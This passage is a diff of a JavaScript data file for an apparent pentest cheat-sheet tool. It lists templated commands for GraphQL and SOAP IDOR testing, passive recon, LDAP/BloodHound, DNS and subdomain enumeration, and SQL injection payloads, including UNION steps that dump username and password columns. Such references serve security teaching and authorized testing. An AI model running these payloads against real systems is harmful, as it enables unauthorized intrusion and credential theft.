+            { id: 'api8', label: 'IDOR via SOAP', os: 'Linux', command: 'curl -X POST $$URL/service -H "Content-Type: text/xml" -d \'<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body><GetUser><id>2</id></GetUser></soapenv:Body></soapenv:Envelope>\'', notes: 'Increment id to test IDOR. Also try: <role>admin</role>, <isAdmin>true</isAdmin>, SQLi in field values.' },
+            ]
+          },
+          {
+            id: 'api-graphql',
+            name: 'GraphQL',
+            commands: [
+            { id: 'api9', label: 'Endpoint discovery (ffuf)', os: 'Linux', command: 'ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,400,405', notes: 'GraphQL often returns 400 for GET requests and 405 for wrong methods. Common paths: /graphql, /api/graphql, /v1/graphql, /graphiql, /playground.' },
+            { id: 'api10', label: 'Confirm GraphQL endpoint', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{__typename}"}\'', notes: 'Valid GraphQL returns {"data":{"__typename":"Query"}}. Any other response format means it\'s not GraphQL.' },
+            { id: 'api11', label: 'Introspection (full schema)', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{ __schema { types { name fields { name } } } }"}\'', notes: 'Dumps entire schema — all types, queries, mutations, and fields. If enabled in production, this is full recon in one request. Hunt for: admin, password, token, role, internal.' },
+            { id: 'api12', label: 'Query unauthorized field', os: 'Linux', command: 'curl -X POST $$URL/graphql -H "Content-Type: application/json" -d \'{"query":"{ user(id: 1) { password role } }"}\'', notes: 'After mapping schema via introspection, test unauthorized field access. Increment id for IDOR testing.' },
+            { id: 'api13', label: 'Check GraphiQL/Playground', os: 'Linux', command: 'curl -s $$URL/graphiql | grep -i graphql', notes: 'If accessible in production: interactive schema explorer with autocomplete — full recon without auth.' },
+            ]
+          }
+        ],
+      },
+      {
+        id: 'recon-passive',
+        name: 'Passive Recon',
+        description: 'Non-intrusive intelligence gathering: archived URLs, Shodan, screenshots, favicon fingerprinting, and Google dorking — zero direct interaction with the target.',
+        tags: ['osint', 'passive', 'web', 'archive'],
+        subtechniques: [
+          {
+            id: 'rpass-archive',
+            name: 'URL & Archive Mining',
+            commands: [
+            { id: 'rpass1', label: 'Wayback Machine (all URLs)', os: 'Linux', command: 'curl -s "http://web.archive.org/cdx/search/cdx?url=$$DOMAIN/*&output=text&fl=original&collapse=urlkey" | sort -u', notes: 'CDX API — pulls every archived URL for the domain. No API key needed. Great starting point for endpoint discovery.' },
+            { id: 'rpass2', label: 'waybackurls', os: 'Linux', command: 'echo $$DOMAIN | waybackurls | sort -u | tee wayback_urls.txt', notes: 'Streams archived URLs from Wayback Machine. Pipe to grep for interesting patterns: ?id=, ?file=, /admin.' },
+            { id: 'rpass3', label: 'gau (all providers)', os: 'Linux', command: 'gau --providers wayback,otx,commoncrawl,urlscan $$DOMAIN | sort -u | tee gau_urls.txt', notes: 'Aggregates URLs from multiple public sources. More complete than waybackurls alone.' },
+            { id: 'rpass4', label: 'gau filter endpoints', os: 'Linux', command: 'gau $$DOMAIN | grep "\\?" | sort -u', notes: 'Filter to only parameterized URLs — prime targets for injection and IDOR testing.' },
+            { id: 'rpass5', label: 'hakrawler passive', os: 'Linux', command: 'echo $$URL | hakrawler -d 3 -subs', notes: 'Passive crawl using page JS, sitemaps, and robots.txt. Includes subdomains with -subs.' },
+            { id: 'rpass6', label: 'katana passive', os: 'Linux', command: 'katana -u $$URL -passive -jc -o katana.txt', notes: '-passive uses web archive sources. -jc parses JavaScript for hidden endpoints.' },
+            ]
+          },
+          {
+            id: 'rpass-shodan',
+            name: 'Shodan & Censys',
+            commands: [
+            { id: 'rpass7', label: 'Shodan host lookup', os: 'Both', command: 'shodan host $$IP', notes: 'Requires shodan CLI: pip install shodan && shodan init YOUR_API_KEY. Shows open ports, banners, CVEs, and geolocation.' },
+            { id: 'rpass8', label: 'Shodan domain search', os: 'Both', command: 'shodan search "hostname:$$DOMAIN" --fields ip_str,port,org,product', notes: 'Find all Shodan-indexed IPs and services linked to a domain.' },
+            { id: 'rpass9', label: 'Shodan SSL cert search', os: 'Both', command: 'shodan search "ssl.cert.subject.CN:$$DOMAIN" --fields ip_str,port,org', notes: 'Find all hosts with SSL certificates issued for the domain — often reveals hidden subdomains and VPNs.' },
+            { id: 'rpass10', label: 'Favicon hash (Python)', os: 'Linux', command: 'python3 -c "import requests,mmh3,codecs; r=requests.get(\'$$URL/favicon.ico\'); h=mmh3.hash(codecs.lookup(\'base64\').encode(r.content)[0]); print(h)"', notes: 'Get the Shodan favicon hash. Then search Shodan: http.favicon.hash:<value> to find all servers running the same app.' },
+            { id: 'rpass11', label: 'Censys IP lookup', os: 'Both', command: 'censys view $$IP', notes: 'Requires censys CLI: pip install censys && censys config. Full TLS, port, and protocol data.' },
+            { id: 'rpass12', label: 'Censys domain search', os: 'Both', command: 'censys search "parsed.names: $$DOMAIN" --index-type certificates', notes: 'Find all certificates issued for the domain via Censys — reveals subdomains and IP ranges.' },
+            ]
+          },
+          {
+            id: 'rpass-google',
+            name: 'Google Dorking',
+            commands: [
+            { id: 'rpass13', label: 'Site all pages', os: 'Both', command: 'site:$$DOMAIN', notes: 'Shows all Google-indexed pages. Add -www to exclude www and find subdomains.' },
+            { id: 'rpass14', label: 'Find login panels', os: 'Both', command: 'site:$$DOMAIN inurl:login OR inurl:admin OR inurl:portal', notes: 'Discover authentication endpoints indexed by Google.' },
+            { id: 'rpass15', label: 'Find exposed files', os: 'Both', command: 'site:$$DOMAIN ext:php OR ext:asp OR ext:aspx OR ext:jsp OR ext:env OR ext:sql', notes: 'Look for exposed source files, config files, and database dumps.' },
+            { id: 'rpass16', label: 'Find subdomains', os: 'Both', command: 'site:*.$$DOMAIN -site:www.$$DOMAIN', notes: 'Find all indexed subdomains while excluding www. Combine with -site: to narrow scope.' },
+            { id: 'rpass17', label: 'Exposed docs & backups', os: 'Both', command: 'site:$$DOMAIN ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx OR ext:bak OR ext:zip', notes: 'Look for accidentally indexed documents, spreadsheets, and backup archives.' },
+            { id: 'rpass18', label: 'Error pages (stack traces)', os: 'Both', command: 'site:$$DOMAIN intext:"sql syntax" OR intext:"warning: mysql" OR intext:"ORA-" OR intext:"stack trace"', notes: 'Find pages leaking error messages — reveals technologies, versions, and SQL context.' },
+            { id: 'rpass19', label: 'Wayback snapshot (browser)', os: 'Both', command: 'https://web.archive.org/web/*/$$DOMAIN', notes: 'Paste in browser. Timeline view of all archived snapshots — check old app versions for exposed endpoints or removed content.' },
+            ]
+          },
+          {
+            id: 'rpass-screen',
+            name: 'Screenshots & Visual Recon',
+            commands: [
+            { id: 'rpass20', label: 'gowitness single', os: 'Linux', command: 'gowitness single $$URL', notes: 'Screenshots a single URL. Output to ./screenshots/ by default.' },
+            { id: 'rpass21', label: 'gowitness from file', os: 'Linux', command: 'gowitness file -f urls.txt --threads 10', notes: 'Screenshot all URLs in a file. Combine with gau/waybackurls output for mass recon.' },
+            { id: 'rpass22', label: 'gowitness from nmap', os: 'Linux', command: 'gowitness nmap -f nmap_scan.xml --open-only --service-contains http', notes: 'Feed nmap XML output directly — screenshots all detected HTTP services.' },
+            { id: 'rpass23', label: 'EyeWitness', os: 'Linux', command: 'python3 EyeWitness.py -f urls.txt --web --timeout 10 -d eyewitness_out/', notes: 'Screenshots + fingerprinting + categorization. Generates HTML report. Good for large scope assessments.' },
+            { id: 'rpass24', label: 'aquatone from urls', os: 'Linux', command: 'cat urls.txt | aquatone -out aquatone_out/', notes: 'Mass screenshot tool with clustering by similarity. Feed domain list from subfinder, amass, or gau.' },
+            ]
+          }
         ],
       },
     ],
@@ -1384,6 +1592,19 @@ const TACTICS = [
         ],
       },
       {
+        id: 'fp-ldap',
+        name: 'LDAP (Port 389/636)',
+        description: 'Enumerate Active Directory and directory services via LDAP.',
+        tags: ['ldap', 'active-directory', 'windows', 'enumeration'],
+        commands: [
+          { id: 'fldap1', label: 'Anonymous LDAP dump', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -b "DC=$$DOMAIN,DC=local" "(objectClass=*)"', notes: 'Works if null session is allowed.' },
+          { id: 'fldap2', label: 'Authenticated user list', os: 'Linux', command: 'ldapsearch -x -H ldap://$$DC -D "$$USER@$$DOMAIN" -w $$PASSWORD -b "DC=$$DOMAIN,DC=local" "(objectClass=user)" sAMAccountName', notes: '' },
+          { id: 'fldap3', label: 'nxc LDAP enum', os: 'Linux', command: 'nxc ldap $$DC -u $$USER -p $$PASSWORD --users', notes: 'Enumerate domain users via LDAP.' },
+          { id: 'fldap4', label: 'BloodHound collection', os: 'Linux', command: 'bloodhound-python -u $$USER -p $$PASSWORD -d $$DOMAIN -dc $$DC -c all', notes: 'Collects all BloodHound data remotely.' },
+          { id: 'fldap5', label: 'Nmap LDAP scripts', os: 'Linux', command: 'nmap -sV -sC -p 389,636 $$IP', notes: 'Detect LDAP version and check anonymous bind.' },
+        ],
+      },
+      {
         id: 'fp-nfs',
         name: 'NFS (Port 2049)',
         description: 'Enumerate and mount NFS exports to access files on the target.',
@@ -1403,23 +1624,79 @@ const TACTICS = [
         tags: ['dns', 'enumeration', 'network'],
                 subtechniques: [
           {
-            id: "dns-basic",
-            name: "Basic Queries",
+            id: "dns-whois",
+            name: "Whois & Infrastructure",
             commands: [
-            { id: "dns1", label: "NS records", os: "Linux", command: "dig NS $$DOMAIN", notes: "Find authoritative nameservers." },
-            { id: "dns2", label: "MX records", os: "Linux", command: "dig MX $$DOMAIN", notes: "Mail exchange servers." },
-            { id: "dns3", label: "All record types", os: "Linux", command: "dig ANY $$DOMAIN @$$IP", notes: "Query all record types from a specific nameserver." }
+            { id: "dns-w1", label: "whois domain", os: "Linux", command: "whois $$DOMAIN", notes: "Registrar, registration dates, nameservers, and contact info." },
+            { id: "dns-w2", label: "whois IP", os: "Linux", command: "whois $$IP", notes: "ASN, CIDR block, and organization for the IP address." },
+            { id: "dns-w3", label: "NS records", os: "Linux", command: "dig NS $$DOMAIN", notes: "Identify authoritative nameservers — needed for zone transfer attempts." },
+            { id: "dns-w4", label: "SOA record", os: "Linux", command: "dig SOA $$DOMAIN", notes: "Start of Authority — primary NS, admin email, serial, and TTL values." }
+            ]
+          },
+          {
+            id: "dns-basic",
+            name: "Record Queries",
+            commands: [
+            { id: "dns1", label: "A record (dig)", os: "Linux", command: "dig A $$DOMAIN", notes: "Resolves domain to IPv4 address." },
+            { id: "dns-b1", label: "AAAA record", os: "Linux", command: "dig AAAA $$DOMAIN", notes: "IPv6 address record." },
+            { id: "dns2", label: "MX records", os: "Linux", command: "dig MX $$DOMAIN", notes: "Mail exchange servers — useful for phishing scope and email infra." },
+            { id: "dns-b2", label: "TXT records", os: "Linux", command: "dig TXT $$DOMAIN", notes: "SPF, DKIM, DMARC, verification tokens, and sometimes internal info." },
+            { id: "dns3", label: "Any record (all types)", os: "Linux", command: "dig ANY $$DOMAIN @$$IP", notes: "Query all record types from a specific nameserver." },
+            { id: "dns-b3", label: "nslookup A record", os: "Both", command: "nslookup $$DOMAIN", notes: "Simple resolution check — works on Windows too." },
+            { id: "dns-b4", label: "nslookup MX", os: "Both", command: "nslookup -type=MX $$DOMAIN", notes: "" },
+            { id: "dns-b5", label: "host A record", os: "Linux", command: "host $$DOMAIN", notes: "Lightweight — shows A, AAAA, and MX quickly." },
+            { id: "dns-b6", label: "Reverse PTR (dig)", os: "Linux", command: "dig -x $$IP", notes: "Reverse DNS lookup — reveals hostname for an IP." }
             ]
           },
           {
             id: "dns-zone",
-            name: "Zone Transfer & Brute",
+            name: "Zone Transfer",
             commands: [
-            { id: "dns4", label: "Zone transfer (dig)", os: "Linux", command: "dig axfr $$DOMAIN @$$IP", notes: "Attempt a full zone transfer. Often blocked but worth trying." },
-            { id: "dns5", label: "Zone transfer (nslookup)", os: "Any", command: "nslookup -type=any -query=AXFR $$DOMAIN $$IP", notes: "" },
-            { id: "dns6", label: "Subdomain brute (dnsenum)", os: "Linux", command: "dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN", notes: "" },
-            { id: "dns7", label: "Subdomain brute (dnsrecon)", os: "Linux", command: "dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt", notes: "" },
-            { id: "dns8", label: "Reverse lookup PTR", os: "Linux", command: "dig -x $$IP @$$IP", notes: "PTR record for an IP." }
+            { id: "dns4", label: "Zone transfer (dig)", os: "Linux", command: "dig axfr $$DOMAIN @$$IP", notes: "Attempt a full zone transfer from the nameserver. Reveals all DNS records if misconfigured." },
+            { id: "dns5", label: "Zone transfer (nslookup)", os: "Both", command: "nslookup -type=any -query=AXFR $$DOMAIN $$IP", notes: "" },
+            { id: "dns-z1", label: "dnsrecon zone transfer", os: "Linux", command: "dnsrecon -d $$DOMAIN -t axfr", notes: "Automated zone transfer attempt with dnsrecon." }
+            ]
+          },
+          {
+            id: "dns-osint",
+            name: "OSINT & Brute Force",
+            commands: [
+            { id: "dns6", label: "dnsenum full enum", os: "Linux", command: "dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN", notes: "Zone transfer + brute force + Google scraping in one command." },
+            { id: "dns7", label: "dnsrecon brute", os: "Linux", command: "dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt", notes: "Brute force subdomains with a wordlist." },
+            { id: "dns-o1", label: "fierce subdomain search", os: "Linux", command: "fierce --domain $$DOMAIN --wordlist $$WORDLIST", notes: "Recursive search with wildcard detection. Finds hidden subdomains not in DNS." },
+            { id: "dns-o2", label: "theHarvester", os: "Linux", command: "theHarvester -d $$DOMAIN -b google,bing,hackertarget,dnsdumpster -l 500", notes: "Collects emails, subdomains, and IPs from public sources. No direct target interaction." }
+            ]
+          }
+        ],
+      },
+      {
+        id: 'fp-subdomain',
+        name: 'Subdomain Enumeration',
+        description: 'Discover subdomains via active brute force and passive OSINT — CT logs, theHarvester, and search engines.',
+        tags: ['dns', 'subdomain', 'osint', 'recon'],
+        subtechniques: [
+          {
+            id: 'fpsub-active',
+            name: 'Active Enumeration',
+            commands: [
+            { id: 'fpsub1', label: 'Zone transfer (dig)', os: 'Linux', command: 'dig axfr $$DOMAIN @$$IP', notes: 'Reveals all DNS records if the nameserver is misconfigured. Rarely works today but always worth attempting.' },
+            { id: 'fpsub2', label: 'dnsenum brute force', os: 'Linux', command: 'dnsenum --dnsserver $$IP --enum -p 0 -s 0 -o subdomains.txt -f $$WORDLIST $$DOMAIN', notes: 'Attempts zone transfer and brute forces subdomains from wordlist.' },
+            { id: 'fpsub3', label: 'gobuster DNS', os: 'Linux', command: 'gobuster dns -d $$DOMAIN -w $$WORDLIST -t 50', notes: 'Fast DNS subdomain brute force.' },
+            { id: 'fpsub4', label: 'fierce recursive', os: 'Linux', command: 'fierce --domain $$DOMAIN --wordlist $$WORDLIST', notes: 'Recursive search with wildcard detection. Finds subdomains not resolvable via brute force.' },
+            { id: 'fpsub5', label: 'dnsrecon brute', os: 'Linux', command: 'dnsrecon -d $$DOMAIN -D $$WORDLIST -t brt', notes: 'Brute forces subdomains and outputs detailed DNS records.' },
+            { id: 'fpsub6', label: 'ffuf subdomain fuzz', os: 'Linux', command: 'ffuf -w $$WORDLIST:FUZZ -u http://FUZZ.$$DOMAIN -fs 0', notes: 'HTTP-based subdomain discovery. Filter common response size with -fs.' }
+            ]
+          },
+          {
+            id: 'fpsub-passive',
+            name: 'Passive Enumeration',
+            commands: [
+            { id: 'fpsub7', label: 'crt.sh all subdomains', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[].name_value\' | sort -u', notes: 'Certificate Transparency logs — no direct target interaction. Certificates often list dev/api/mail subdomains.' },
+            { id: 'fpsub8', label: 'crt.sh filter keyword', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[] | select(.name_value | contains("dev")) | .name_value\' | sort -u', notes: 'Filter CT results to subdomains containing a keyword (dev, api, admin, staging).' },
+            { id: 'fpsub9', label: 'crt.sh save to file', os: 'Linux', command: 'curl -s "https://crt.sh/?q=$$DOMAIN&output=json" | jq -r \'.[].name_value\' | sort -u > subdomains.txt', notes: 'Save all discovered subdomains to a file for further processing.' },
+            { id: 'fpsub10', label: 'theHarvester OSINT', os: 'Linux', command: 'theHarvester -d $$DOMAIN -b google,bing,hackertarget,dnsdumpster -l 500', notes: 'Collects emails, subdomains, and IPs from search engines and public databases.' },
+            { id: 'fpsub11', label: 'theHarvester all sources', os: 'Linux', command: 'theHarvester -d $$DOMAIN -b all -l 500 -f results.json', notes: 'Aggregate results from all configured passive sources into a JSON report.' },
+            { id: 'fpsub12', label: 'Google dork subdomains', os: 'Both', command: 'site:$$DOMAIN', notes: 'Paste into Google — finds all indexed subdomains and public-facing assets.' }
             ]
           }
         ],
@@ -1760,216 +2037,129 @@ const TACTICS = [
             id: "wr-dir",
             name: "Directory Brute",
             commands: [
-            { id: "wr1", label: "ffuf directory brute", os: "Linux", command: "ffuf -u http://$$IP/FUZZ -w $$WORDLIST -mc 200,301,302,403 -t 50", notes: "" },
-            { id: "wr2", label: "feroxbuster recursive", os: "Linux", command: "feroxbuster -u http://$$IP -w $$WORDLIST -x php,html,txt --depth 3", notes: "Auto-recursive directory scanning." }
+            { id: "wr1", label: "ffuf directory brute", os: "Linux", command: "ffuf -u $$URL/FUZZ -w $$WORDLIST -mc 200,301,302,403 -t 50", notes: "" },
+            { id: "wr2", label: "feroxbuster recursive", os: "Linux", command: "feroxbuster -u $$URL -w $$WORDLIST -x php,html,txt --depth 3", notes: "Auto-recursive directory scanning." }
             ]
           },
           {
             id: "wr-fp",
             name: "Fingerprint & Scan",
             commands: [
-            { id: "wr3", label: "whatweb fingerprint", os: "Linux", command: "whatweb -a 3 http://$$IP", notes: "Identify web stack, CMS, and server version." },
-            { id: "wr4", label: "WAF detection", os: "Linux", command: "wafw00f http://$$IP", notes: "Detect and identify WAF products." },
-            { id: "wr5", label: "Arjun parameter discovery", os: "Linux", command: "arjun -u http://$$IP/page.php", notes: "Discovers hidden GET/POST parameters." },
-            { id: "wr6", label: "nuclei scan", os: "Linux", command: "nuclei -u http://$$IP -t /root/nuclei-templates/ -severity medium,high,critical", notes: "Template-based vulnerability scanner." },
+            { id: "wr3", label: "whatweb fingerprint", os: "Linux", command: "whatweb -a 3 $$URL", notes: "Identify web stack, CMS, and server version." },
+            { id: "wr4", label: "WAF detection", os: "Linux", command: "wafw00f $$URL", notes: "Detect and identify WAF products." },
+            { id: "wr5", label: "Arjun parameter discovery", os: "Linux", command: "arjun -u $$URL/page.php", notes: "Discovers hidden GET/POST parameters." },
+            { id: "wr6", label: "nuclei scan", os: "Linux", command: "nuclei -u $$URL -t /root/nuclei-templates/ -severity medium,high,critical", notes: "Template-based vulnerability scanner." },
             { id: "wr7", label: "Google dorks", os: "Both", command: "site:$$DOMAIN ext:php OR ext:asp OR ext:aspx OR ext:jsp\nsite:$$DOMAIN inurl:admin OR inurl:login OR inurl:dashboard\nsite:$$DOMAIN \"index of /\"", notes: "Paste into Google to find exposed endpoints." }
             ]
           }
         ],
       },
       {
-        id: 'web-sqli-detect',
-        name: 'SQLi — Detection & Fingerprinting',
-        description: 'Identify injection points and determine the database engine type.',
+        id: 'web-sqli',
+        name: 'SQL Injection',
+        description: 'Full SQLi methodology: detection, manual exploitation (UNION, Error, Blind), sqlmap automation, and WAF bypass.',
         tags: ['web', 'sqli'],
-                subtechniques: [
+        subtechniques: [
           {
-            id: "sqd-man",
-            name: "Manual Probes",
+            id: 'sqli-detect',
+            name: 'Detection & Fingerprinting',
             commands: [
-            { id: "sqd1", label: "Quote probes", os: "Both", command: "'\n\"\n`\n')--\n\"))--\n'--\n'#", notes: "Inject one at a time into every parameter. A SQL error or changed response = injection point." },
-            { id: "sqd2", label: "Boolean difference test", os: "Both", command: "' AND 1=1-- -\n' AND 1=2-- -\n' AND 'a'='a\n' AND 'a'='b", notes: "If page differs between TRUE/FALSE payloads, boolean injection is confirmed." },
-            { id: "sqd3", label: "Time-based confirmation", os: "Both", command: "' AND SLEEP(5)-- -\n' AND IF(1=1,SLEEP(5),0)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -\n' AND 1=1 AND SLEEP(5)-- -", notes: "Page delay of ~5s confirms blind injection. First = MySQL, third = MSSQL, fourth = PostgreSQL." },
-            { id: "sqd4", label: "DB engine fingerprint", os: "Both", command: "' AND 1=CONVERT(int,'a')-- -\n' AND extractvalue(1,concat(0x7e,version()))-- -\n' AND 1=(SELECT 1 FROM dual)-- -\n' AND version()>0-- -", notes: "\"Conversion failed\" = MSSQL. \"XPATH syntax error\" = MySQL. \"dual\" table = Oracle." },
-            { id: "sqd5", label: "Comment style probes", os: "Both", command: "1-- -\n1#\n1/*comment*/\n1/*!50000 AND 1=1*/", notes: "-- and # = MySQL/MariaDB. Only -- = MSSQL/PostgreSQL/Oracle. /*!...*/ = MySQL version-specific." }
+            { id: 'sqd1', label: 'Quote probes', os: 'Both', command: "'\n\"\n`\n')--\n\"))--\n'--\n'#", notes: 'Inject one at a time into every parameter. A SQL error or changed response = injection point.' },
+            { id: 'sqd2', label: 'Boolean difference test', os: 'Both', command: "' AND 1=1-- -\n' AND 1=2-- -\n' AND 'a'='a\n' AND 'a'='b", notes: 'If page differs between TRUE/FALSE payloads, boolean injection is confirmed.' },
+            { id: 'sqd3', label: 'Time-based confirmation', os: 'Both', command: "' AND SLEEP(5)-- -\n' AND IF(1=1,SLEEP(5),0)-- -\n'; WAITFOR DELAY '0:0:5'-- -\n'; SELECT pg_sleep(5)-- -", notes: 'Page delay of ~5s confirms blind injection. SLEEP = MySQL, WAITFOR = MSSQL, pg_sleep = PostgreSQL.' },
+            { id: 'sqd4', label: 'DB engine fingerprint', os: 'Both', command: "' AND 1=CONVERT(int,'a')-- -\n' AND extractvalue(1,concat(0x7e,version()))-- -\n' AND 1=(SELECT 1 FROM dual)-- -\n' AND version()>0-- -", notes: '"Conversion failed" = MSSQL. "XPATH syntax error" = MySQL. "dual" table = Oracle.' },
+            { id: 'sqd5', label: 'Comment style probes', os: 'Both', command: "1-- -\n1#\n1/*comment*/\n1/*!50000 AND 1=1*/", notes: '-- and # = MySQL/MariaDB. Only -- works in MSSQL/PostgreSQL/Oracle. /*!...*/ = MySQL version comment.' },
+            { id: 'sqd6', label: 'Header-based injection', os: 'Linux', command: "curl -H \"X-Forwarded-For: 1'\" $$URL/\ncurl -A \"test' AND SLEEP(5)-- -\" $$URL/\ncurl -H \"Referer: http://x.com' AND 1=1-- -\" $$URL/\ncurl -b \"id=1' AND SLEEP(5)-- -\" $$URL/", notes: 'Headers logged to a DB (analytics, audit trails) are often injection points.' },
+            { id: 'sqd7', label: 'sqlmap banner + fingerprint', os: 'Linux', command: "sqlmap -u '$$VULN_URL' --banner --current-user --current-db --hostname --batch", notes: 'Confirms injection and immediately grabs DB version, current user, and DB name.' },
             ]
           },
           {
-            id: "sqd-tool",
-            name: "Header & Tool",
+            id: 'sqli-union',
+            name: 'UNION Extraction',
             commands: [
-            { id: "sqd6", label: "Header-based injection test", os: "Linux", command: "curl -H \"X-Forwarded-For: 1'\" http://$$IP/\ncurl -A \"test' AND SLEEP(5)-- -\" http://$$IP/\ncurl -H \"Referer: http://x.com' AND 1=1-- -\" http://$$IP/\ncurl -b \"id=1' AND SLEEP(5)-- -\" http://$$IP/", notes: "Headers written to a DB (logging, analytics) are common injection points." },
-            { id: "sqd7", label: "sqlmap banner + fingerprint", os: "Linux", command: "sqlmap -u '$$VULN_URL' --banner --current-user --current-db --hostname --batch", notes: "Confirms injection and immediately grabs DB version, current user, and DB name." }
-            ]
-          }
-        ],
-      },
-      {
-        id: 'web-sqli-union',
-        name: 'SQLi — UNION-Based Extraction',
-        description: 'Step-by-step UNION SELECT attack to extract data from any table when results are reflected in the page.',
-        tags: ['web', 'sqli'],
-                subtechniques: [
-          {
-            id: "squ-col",
-            name: "Column Discovery",
-            commands: [
-            { id: "squ1", label: "1. Find column count (ORDER BY)", os: "Both", command: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n' ORDER BY 4-- -", notes: "Increment until you get an error — column count = last working number." },
-            { id: "squ2", label: "1b. Find column count (UNION NULL)", os: "Both", command: "' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL,NULL-- -", notes: "Add NULLs until no error. Works where ORDER BY is blocked." },
-            { id: "squ3", label: "2. Find printable columns", os: "Both", command: "' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -", notes: "Replace NULL with 'a' one at a time to find which columns reflect string data in the page." }
+            { id: 'squ1', label: '1. Column count (ORDER BY)', os: 'Both', command: "' ORDER BY 1-- -\n' ORDER BY 2-- -\n' ORDER BY 3-- -\n' ORDER BY 4-- -", notes: 'Increment until error — column count = last working number.' },
+            { id: 'squ2', label: '1b. Column count (UNION NULL)', os: 'Both', command: "' UNION SELECT NULL-- -\n' UNION SELECT NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL-- -\n' UNION SELECT NULL,NULL,NULL,NULL-- -", notes: 'Add NULLs until no error. Use when ORDER BY is blocked.' },
+            { id: 'squ3', label: '2. Find printable columns', os: 'Both', command: "' UNION SELECT 'a',NULL,NULL-- -\n' UNION SELECT NULL,'a',NULL-- -\n' UNION SELECT NULL,NULL,'a'-- -", notes: "Replace NULL with 'a' one at a time — find columns that reflect string data in the page." },
+            { id: 'squ4', label: '3. Extract DB metadata', os: 'Both', command: "' UNION SELECT @@version,NULL,NULL-- -\n' UNION SELECT user(),database(),@@datadir-- -\n' UNION SELECT @@version,DB_NAME(),SYSTEM_USER-- -", notes: 'Adjust column count. First two lines = MySQL; third line = MSSQL.' },
+            { id: 'squ5', label: '4. List all databases', os: 'Both', command: "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n' UNION SELECT name,NULL FROM master..sysdatabases-- -", notes: 'First = MySQL. Second = MSSQL.' },
+            { id: 'squ6', label: '5. List tables', os: 'Both', command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM $$DB_NAME..sysobjects WHERE xtype='U'-- -", notes: 'First = MySQL/PostgreSQL. Second = MSSQL.' },
+            { id: 'squ7', label: '6. List columns', os: 'Both', command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE' AND table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: 'First = MySQL. Second = MSSQL.' },
+            { id: 'squ8', label: '7. Dump data', os: 'Both', command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE-- -\n' UNION SELECT CONCAT(username,0x3a,password),NULL FROM $$DB_TABLE-- -\n' UNION SELECT username||':'||password,NULL FROM $$DB_TABLE-- -", notes: '0x3a = colon separator. Second = MySQL CONCAT. Third = PostgreSQL string concat.' },
+            { id: 'squ9', label: '8. Paginate rows (LIMIT/OFFSET)', os: 'Both', command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 0-- -\n' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 1-- -", notes: 'Extract one row at a time when only a single result is reflected.' },
             ]
           },
           {
-            id: "squ-data",
-            name: "Data Extraction",
+            id: 'sqli-error',
+            name: 'Error-Based',
             commands: [
-            { id: "squ4", label: "3. Extract DB metadata", os: "Both", command: "' UNION SELECT @@version,NULL,NULL-- -\n' UNION SELECT user(),database(),@@datadir-- -\n' UNION SELECT @@version,DB_NAME(),SYSTEM_USER-- -", notes: "Adjust column count to match your target. First entry = MySQL, second line = MSSQL." },
-            { id: "squ5", label: "4. List all databases", os: "Both", command: "' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n' UNION SELECT name,NULL FROM master..sysdatabases-- -", notes: "First = MySQL. Second = MSSQL." },
-            { id: "squ6", label: "5. List tables", os: "Both", command: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM $$DB_NAME..sysobjects WHERE xtype='U'-- -", notes: "First = MySQL/PostgreSQL. Second = MSSQL." },
-            { id: "squ7", label: "6. List columns", os: "Both", command: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='$$DB_TABLE' AND table_schema='$$DB_NAME'-- -\n' UNION SELECT name,NULL FROM syscolumns WHERE id=OBJECT_ID('$$DB_TABLE')-- -", notes: "First = MySQL. Second = MSSQL." },
-            { id: "squ8", label: "7. Dump data", os: "Both", command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE-- -\n' UNION SELECT CONCAT(username,0x3a,password),NULL FROM $$DB_TABLE-- -\n' UNION SELECT username||':'||password,NULL FROM $$DB_TABLE-- -", notes: "0x3a = colon separator. Second = MySQL CONCAT. Third = PostgreSQL string concat." },
-            { id: "squ9", label: "8. Pagination (LIMIT/OFFSET)", os: "Both", command: "' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 0-- -\n' UNION SELECT $$DB_COLUMN,NULL FROM $$DB_TABLE LIMIT 1 OFFSET 1-- -", notes: "Extract one row at a time when only one result is reflected." }
-            ]
-          }
-        ],
-      },
-      {
-        id: 'web-sqli-error',
